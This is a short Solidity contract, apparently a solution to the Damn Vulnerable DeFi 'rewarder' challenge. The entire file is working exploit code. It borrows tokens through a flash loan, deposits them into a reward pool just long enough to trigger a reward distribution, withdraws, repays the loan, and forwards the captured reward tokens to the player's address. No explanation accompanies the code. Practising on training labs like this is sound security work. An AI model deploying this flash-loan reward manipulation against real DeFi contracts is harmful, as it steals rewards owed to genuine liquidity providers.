// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";

import {RewardToken} from "./RewardToken.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256) external;
}

interface IRewarderPool {
    function deposit(uint256) external;

    function withdraw(uint256) external;

    function distributeRewards() external returns (uint256);
}

contract Attacker {
    IFlashLoanerPool flashLoanPool;
    IRewarderPool rewardPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;
    address public player;

    constructor(
        address _flashLoanPool,
        address _rewardPool,
        address liquidityTokenAddress,
        address rewardTokenAddress,
        address _player
    ) {
        flashLoanPool = IFlashLoanerPool(_flashLoanPool);
        rewardPool = IRewarderPool(_rewardPool);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        player = _player;
    }

    function attack(uint256 amount) external {
        liquidityToken.approve(address(rewardPool), amount);
        flashLoanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 _amount) external {
        rewardPool.deposit(_amount);
        rewardPool.distributeRewards();
        rewardPool.withdraw(_amount);
        liquidityToken.transfer(address(flashLoanPool), _amount);
        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
    }
}
